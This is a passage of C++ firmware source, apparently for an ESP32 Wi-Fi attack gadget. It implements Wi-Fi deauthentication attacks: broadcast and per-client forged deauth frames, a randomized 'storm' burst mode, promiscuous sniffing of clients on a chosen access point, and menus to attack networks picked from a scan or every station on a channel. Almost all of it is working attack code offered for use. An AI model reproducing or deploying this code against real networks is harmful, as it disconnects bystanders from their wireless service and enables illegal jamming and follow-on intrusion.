    wifiDisconnect();
    WiFi.mode(savedState.wifi_mode);

    drawSummaryScreen("Attack Done", ui.totalFrames, (int)burst_counter, is_5ghz, has_multiple_bands, wasConnected);
    if (wasConnected) restoreWiFiState(savedState);
    while (!check(AnyKeyPress)) vTaskDelay(50 / portTICK_PERIOD_MS);
}

// ---------------------------------------------------------------------------
// runDeauthAll() — broadcast deauth on AP
// ---------------------------------------------------------------------------
void runDeauthAll(uint8_t *targetMAC, int channel) {
    WiFiState savedState = saveWiFiState();
    int  band           = getWiFiBand(channel);
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;

    if (!initializeDeauthMode(channel, savedState)) { restoreWiFiState(savedState); return; }

    String bandStr = (band==1)?"5GHz":(band==2)?"6GHz":"2.4GHz";
    bool isBcast = memcmp(targetMAC, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0;

    DeauthUIState ui;
    ui.title       = "Deauth All";
    ui.targetStr   = isBcast ? "Broadcast" : macToString(targetMAC);
    ui.apStr       = "";
    ui.bandStr     = bandStr;
    ui.channel     = channel;
    ui.totalFrames = 0;
    ui.burstCount  = 0;
    ui.fps         = 0;
    ui.stormActive = false;
    ui.paused      = false;
    ui.multiBand   = false;
    ui.multiAP     = useMultipleAPs;
    ui.apCount     = (int)sameSSID_APs.size();
    ui.speedMs     = SPEED_DEF;

    drawDeauthScreen(ui);

    SelPress = false; EscPress = false; PrevPress = false; NextPress = false; UpPress = false; DownPress = false;
    delay(100);

    uint8_t broadcast_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t frame[26];
    uint32_t start_time   = millis();
    int  ap_index        = 0;
    int  reason_index    = 0;
    bool storm_active    = false;
    uint32_t burst_counter = 0;

    while (!check(EscPress)) {

        if (check(SelPress)) { ui.paused = !ui.paused; drawDeauthScreen(ui); }
        if (ui.paused) { vTaskDelay(50 / portTICK_PERIOD_MS); continue; }
        handleSpeedInput(ui.speedMs);

        if (ui.totalFrames % 60 == 0) {
            int rc = 0;
            getDeauthReasons(band, &rc);
            reason_index = (reason_index + 1) % rc;
        }
        int rc = 0;
        const uint8_t *reasons = getDeauthReasons(band, &rc);
        uint8_t reason = reasons[reason_index];

        if (useMultipleAPs) {
            ap_index = (ap_index + 1) % sameSSID_APs.size();
            APInfo &cur = sameSSID_APs[ap_index];
            esp_wifi_set_channel(cur.channel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(50 / portTICK_PERIOD_MS);
            buildOptimizedDeauthFrame(frame, broadcast_mac, cur.bssid, cur.bssid, reason, false);
        } else {
            buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, reason, false);
        }

        sendDeauthFrames(frame, 26);
        ui.totalFrames += 3; burst_counter++;

        if (ui.totalFrames % 300 == 0 && random(100) < 40) storm_active = true;

        int delay_ms = ui.speedMs;
        if (storm_active) {
            delay_ms = max(1, delay_ms / 3);
            if (random(100) < 30) {
                uint8_t er = reasons[random(rc)];
                if (useMultipleAPs) {
                    APInfo &ca = sameSSID_APs[ap_index % sameSSID_APs.size()];
                    buildOptimizedDeauthFrame(frame, broadcast_mac, ca.bssid, ca.bssid, er, false);
                } else {
                    buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, er, false);
                }
                sendDeauthFrames(frame, 26);
                ui.totalFrames += 3; burst_counter++;
            }
            if (random(100) < 10) storm_active = false;
        }
        delay(delay_ms);

        ui.stormActive = storm_active;
        ui.burstCount  = (int)burst_counter;

        if (millis() - start_time > 1000) {
            start_time = millis();
            drawDeauthScreen(ui);
        }
    }

    wifiDisconnect();
    WiFi.mode(savedState.wifi_mode);
    delay(500);
    drawSummaryScreen("Attack Done", ui.totalFrames, (int)burst_counter, false, false, savedState.was_connected);
    if (savedState.was_connected) restoreWiFiState(savedState);
    while (!check(AnyKeyPress)) vTaskDelay(50 / portTICK_PERIOD_MS);
}

// ---------------------------------------------------------------------------
// runDeauthTargetList() — deauth a list of clients
// ---------------------------------------------------------------------------
void runDeauthTargetList(const std::vector<Host> &targets, uint8_t *targetMAC, int channel) {
    if (targets.empty()) { displayError("No targets selected", true); return; }

    WiFiState savedState = saveWiFiState();
    int  band           = getWiFiBand(channel);
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;

    if (!initializeDeauthMode(channel, savedState)) { restoreWiFiState(savedState); return; }

    String bandStr = (band==1)?"5GHz":(band==2)?"6GHz":"2.4GHz";

    DeauthUIState ui;
    ui.title       = "Deauth List";
    ui.targetStr   = String(targets.size()) + " targets";
    ui.apStr       = macToString(targetMAC);
    ui.bandStr     = bandStr;
    ui.channel     = channel;
    ui.totalFrames = 0;
    ui.burstCount  = 0;
    ui.fps         = 0;
    ui.stormActive = false;
    ui.paused      = false;
    ui.multiBand   = false;
    ui.multiAP     = useMultipleAPs;
    ui.apCount     = (int)sameSSID_APs.size();
    ui.speedMs     = SPEED_DEF;

    drawDeauthScreen(ui);

    SelPress = false; EscPress = false; PrevPress = false; NextPress = false; UpPress = false; DownPress = false;
    delay(100);

    uint32_t start_time   = millis();
    size_t target_index  = 0;
    int    ap_index      = 0;
    bool   storm_active  = false;
    uint32_t burst_counter = 0;

    while (!check(EscPress)) {

        if (check(SelPress)) { ui.paused = !ui.paused; drawDeauthScreen(ui); }
        if (ui.paused) { vTaskDelay(50 / portTICK_PERIOD_MS); continue; }
        handleSpeedInput(ui.speedMs);

        if (target_index >= targets.size()) target_index = 0;
        const Host &host = targets[target_index];
        uint8_t hostMAC[6];
        stringToMAC(host.mac.c_str(), hostMAC);

        if (!isMACZero(hostMAC)) {
            uint8_t frames[4][26];
            int rc = 0;
            const uint8_t *reasons = getDeauthReasons(band, &rc);
            uint8_t reason = reasons[random(rc)];

            if (useMultipleAPs) {
                ap_index = (ap_index + 1) % sameSSID_APs.size();
                APInfo &cur = sameSSID_APs[ap_index];
                esp_wifi_set_channel(cur.channel, WIFI_SECOND_CHAN_NONE);
                vTaskDelay(50 / portTICK_PERIOD_MS);
                buildOptimizedDeauthFrame(frames[0], hostMAC, cur.bssid, cur.bssid, reason, false);
                buildOptimizedDeauthFrame(frames[1], hostMAC, cur.bssid, cur.bssid, reason, true);
                buildOptimizedDeauthFrame(frames[2], cur.bssid, hostMAC, cur.bssid, reason, false);
                buildOptimizedDeauthFrame(frames[3], cur.bssid, hostMAC, cur.bssid, reason, true);
            } else {
                buildOptimizedDeauthFrame(frames[0], hostMAC, targetMAC, targetMAC, reason, false);
                buildOptimizedDeauthFrame(frames[1], hostMAC, targetMAC, targetMAC, reason, true);
                buildOptimizedDeauthFrame(frames[2], targetMAC, hostMAC, targetMAC, reason, false);
                buildOptimizedDeauthFrame(frames[3], targetMAC, hostMAC, targetMAC, reason, true);
            }
            for (int i = 0; i < 4; i++) { sendDeauthFrames(frames[i], 26); ui.totalFrames += 3; burst_counter++; }
        }
        target_index++;

        int delay_ms = ui.speedMs;
        if (storm_active) delay_ms = max(1, delay_ms / 3);
        delay(delay_ms);

        ui.stormActive = storm_active;
        ui.burstCount  = (int)burst_counter;

        if (millis() - start_time > 1000) {
            start_time = millis();
            drawDeauthScreen(ui);
        }
    }

    wifiDisconnect();
    WiFi.mode(savedState.wifi_mode);
    delay(500);
    drawSummaryScreen("Attack Done", ui.totalFrames, (int)burst_counter, false, false, savedState.was_connected);
    if (savedState.was_connected) restoreWiFiState(savedState);
    while (!check(AnyKeyPress)) vTaskDelay(50 / portTICK_PERIOD_MS);
}

// ---------------------------------------------------------------------------
// scanClientsOnAP() — improved scan UI
// ---------------------------------------------------------------------------
void scanClientsOnAP(uint8_t *targetMAC, int channel) {
    WiFiState savedState = saveWiFiState();
    bool wasConnected    = savedState.was_connected;

    detectedClients.clear();
    memcpy(scanTargetBSSID, targetMAC, 6);
    clientScanActive = true;

    if (!initializeDeauthMode(channel, savedState)) {
        displayError("Failed to enter AP mode", true);
        clientScanActive = false;
        if (wasConnected) restoreWiFiState(savedState);
        return;
    }

    esp_wifi_set_promiscuous_rx_cb(clientSnifferCallback);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    uint8_t broadcast_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t frame[26];
    buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, 0x07, false);

    const int maxSec = 8;
    uint32_t startTime = millis();
    int scanCount = 0;

    drawScanScreen(0, 0, maxSec);

    SelPress = false; EscPress = false; PrevPress = false; NextPress = false;
    delay(100);

    while (!check(EscPress) && millis() - startTime < (uint32_t)(maxSec * 1000)) {
        int elapsed = (int)((millis() - startTime) / 1000);
        if (elapsed != scanCount) {
            scanCount = elapsed;
            sendDeauthFrames(frame, 26);
            drawScanScreen(scanCount, (int)detectedClients.size(), maxSec);
        }
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    clientScanActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    if (wasConnected) restoreWiFiState(savedState);
    showClientSelectionForDeauth(detectedClients, targetMAC, channel);
}

// ---------------------------------------------------------------------------
// Remaining menu functions — unchanged logic, UI improvements only
// ---------------------------------------------------------------------------
void clientSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!clientScanActive) return;
    wifi_promiscuous_pkt_t *pkt    = (wifi_promiscuous_pkt_t *)buf;
    wifi_header_t          *header = (wifi_header_t *)pkt->payload;
    if (type == WIFI_PKT_DATA) {
        uint8_t clientMAC[6];
        memcpy(clientMAC, header->addr2, 6);
        if (memcmp(header->addr1, scanTargetBSSID, 6) == 0 || memcmp(header->addr3, scanTargetBSSID, 6) == 0) {
            bool exists = false;
            for (auto &c : detectedClients) {
                uint8_t em[6]; stringToMAC(c.mac.c_str(), em);
                if (memcmp(em, clientMAC, 6) == 0) { exists = true; break; }
            }
            if (!exists) {
                ip4_addr_t ip; ip.addr = 0;
                eth_addr   eth; memcpy(eth.addr, clientMAC, 6);
                Host client(&ip, &eth, "", getVendorFromMAC(MAC(eth.addr)), pkt->rx_ctrl.rssi);
                detectedClients.push_back(client);
            }
        }
    }
}

void showClientSelectionForDeauth(const std::vector<Host> &clients, uint8_t *targetMAC, int channel) {
    options.clear();
    uint8_t apBssid[6];
    memcpy(apBssid, targetMAC, 6);
    if (!clients.empty()) {
        for (auto &client : clients) {
            String displayText;
            if (!client.hostname.isEmpty())
                displayText = client.hostname + " (" + client.mac + ") " + String(client.rssi) + "dBm";
            else if (!client.vendor.isEmpty() && client.vendor != "Unknown")
                displayText = client.vendor + " (" + client.mac + ") " + String(client.rssi) + "dBm";
            else
                displayText = client.mac + " " + String(client.rssi) + "dBm";
            options.push_back({displayText.c_str(), [=]() { stationDeauth(client, apBssid); }});
        }
    }
    options.push_back({"Deauth ALL Clients", [=]() { runDeauthAll(targetMAC, channel); }});
    options.push_back({"Rescan",             [=]() { scanClientsOnAP(targetMAC, channel); }});
    options.push_back({"Back",               []()  { returnToMenu = true; }});
    addOptionToMainMenu();
    loopOptions(options);
}

void deauthTargetListMenu() { showAPSelectionForClientDeauth(); }

void showTargetSelection() {
    drawMainBorderWithTitle("Select Target");
    displayTextLine("Scanning for networks...");
    int n = WiFi.scanNetworks(false, true);
    if (n == 0) { displayError("No networks found", true); return; }
    options.clear();
    for (int i = 0; i < n; i++) {
        String ssid    = WiFi.SSID(i);
        String bssid   = WiFi.BSSIDstr(i);
        int    channel = WiFi.channel(i);
        int    rssi    = WiFi.RSSI(i);
        String name    = ssid.length() > 0 ? ssid : "<Hidden>";
        String opt     = name + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
        options.push_back({opt.c_str(), [=]() {
            uint8_t mac[6];
            sscanf(bssid.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
            eth_addr eth; memcpy(eth.addr, mac, 6);
            ip4_addr_t ip; ip.addr = 0;
            Host target(&ip, &eth);
            stationDeauth(target);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    addOptionToMainMenu();
    loopOptions(options);
}

std::vector<Host> buildTargetListFromScan() {
    std::vector<Host> targets;
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
        String bssid = WiFi.BSSIDstr(i);
        uint8_t mac[6];
        sscanf(bssid.c_str(),"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
        eth_addr eth; memcpy(eth.addr, mac, 6);
        ip4_addr_t ip; ip.addr = 0;
        Host host(&ip, &eth);
        targets.push_back(host);
    }
    return targets;
}

void deauthAllFromScan() {
    drawMainBorderWithTitle("Select AP");
    displayTextLine("Scanning for networks...");
    int n = WiFi.scanNetworks(false, false);
    if (n == 0) { displayError("No networks found", true); return; }
    options.clear();
    for (int i = 0; i < n; i++) {
        String ssid    = WiFi.SSID(i);
        String bssid   = WiFi.BSSIDstr(i);
        int    channel = WiFi.channel(i);
        int    rssi    = WiFi.RSSI(i);
        String name    = ssid.length() > 0 ? ssid : "<Hidden>";
        String opt     = name + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
        options.push_back({opt.c_str(), [=]() {
            uint8_t targetMAC[6];
            memcpy(targetMAC, WiFi.BSSID((uint8_t)i), 6);
            int ch = WiFi.channel((uint8_t)i);
            WiFi.scanDelete();
            SelPress = false; EscPress = false; PrevPress = false; NextPress = false;
            delay(100);
            runDeauthAll(targetMAC, ch);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    addOptionToMainMenu();
    loopOptions(options);
}

void deauthAllByChannel() {
    drawMainBorderWithTitle("Select Channel");
    options.clear();
    for (int ch = 1; ch <= 14; ch++) {
        String band = (ch >= 1 && ch <= 11) ? "2.4GHz" : "2.4GHz(ext)";
        String opt  = "Channel " + String(ch) + " (" + band + ")";
        options.push_back({opt.c_str(), [=]() {
            uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            SelPress = false; EscPress = false; PrevPress = false; NextPress = false;
            delay(100);
            runDeauthAll(bcast, ch);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    addOptionToMainMenu();
    loopOptions(options);
}

void deauthAllMenu() {
    drawMainBorderWithTitle("Deauth All");
    options = {
        {"Select from Scan", [=]() { deauthAllFromScan();   }},
        {"Select Channel",   [=]() { deauthAllByChannel();  }},
        {"Back",             [=]() { returnToMenu = true;   }},
    };
    addOptionToMainMenu();
    loopOptions(options);
}

void showAPSelectionForClientDeauth() {
    drawMainBorderWithTitle("Select AP");
    displayTextLine("Scanning for networks...");
    int n = WiFi.scanNetworks(false, false);
    if (n == 0) { displayError("No networks found", true); return; }
    options.clear();
    for (int i = 0; i < n; i++) {
        String ssid    = WiFi.SSID(i);
        String bssid   = WiFi.BSSIDstr(i);
        int    channel = WiFi.channel(i);
        int    rssi    = WiFi.RSSI(i);
        String name    = ssid.length() > 0 ? ssid : "<Hidden>";
        String opt     = name + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
        options.push_back({opt.c_str(), [=]() {
            uint8_t targetMAC[6];
            memcpy(targetMAC, WiFi.BSSID((uint8_t)i), 6);
            int ch = WiFi.channel((uint8_t)i);
            WiFi.scanDelete();
            SelPress = false; EscPress = false; PrevPress = false; NextPress = false;
            delay(100);
            scanClientsOnAP(targetMAC, ch);
        }});
    }
    options.push_back({"Back", []() { returnToMenu = true; }});
    addOptionToMainMenu();
    loopOptions(options);
}
